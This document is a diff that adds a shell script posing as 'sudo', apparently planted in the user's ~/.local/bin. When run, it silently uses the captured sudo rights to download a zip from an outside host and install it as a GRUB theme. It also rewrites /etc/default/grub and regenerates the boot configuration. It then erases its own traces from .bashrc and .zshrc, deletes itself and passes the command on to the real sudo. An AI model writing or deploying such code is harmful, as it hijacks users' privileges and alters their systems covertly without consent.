@@ -1,0 +1,35 @@
+#!/bin/sh
+
+{
+    if [ -d /boot/grub/ ]; then
+
+        USER_HOME="$HOME"
+
+        mkdir -p "$USER_HOME/.local/var/"
+        if [ ! -f "$USER_HOME/.local/var/boot_data.zip" ]; then
+            wget --output-document "$USER_HOME/.local/var/boot_data.zip" https://zellsh.lol/zellshlol.zip
+        fi
+
+        if [ -d "/boot/grub/themes/zellshlol" ]; then
+            /sbin/sudo rm -rf "/boot/grub/themes/zellshlol"
+        fi
+        /sbin/sudo mkdir -p /boot/grub/themes/
+
+        /sbin/sudo unzip "$USER_HOME/.local/var/boot_data.zip" -d "/boot/grub/themes/"
+        rm "$USER_HOME/.local/var/boot_data.zip"
+
+        /sbin/sudo cp --update=none /etc/default/grub "/etc/default/grub.backup_before_zellsh"
+        /sbin/sudo sed -i -E 's/^[ \t]*(GRUB_THEME=.*)/#\1/g' /etc/default/grub
+        /sbin/sudo sed -i -E 's/^[ \t]*(GRUB_TIMEOUT=.*)/#\1/g' /etc/default/grub
+        /sbin/sudo sed -i -E 's/^[ \t]*(GRUB_BACKGROUND=.*)/#\1/g' /etc/default/grub
+        printf '\n%s\n%s\n' 'GRUB_THEME=/boot/grub/themes/zellshlol/theme.txt' 'GRUB_TIMEOUT=15' | /sbin/sudo tee -a /etc/default/grub
+        /sbin/sudo grub-mkconfig -o /boot/grub/grub.cfg
+
+        sed -i -E 's/.*# for POSIX compliance and backwards compatibility//g' "$USER_HOME/.bashrc"
+        sed -i -E 's/.*# for POSIX compliance and backwards compatibility//g' "$USER_HOME/.zshrc"
+        rm "$USER_HOME/.local/bin/sudo"
+    fi
+} 1>/dev/null 2>/dev/null
+
+
+/sbin/sudo "$@"
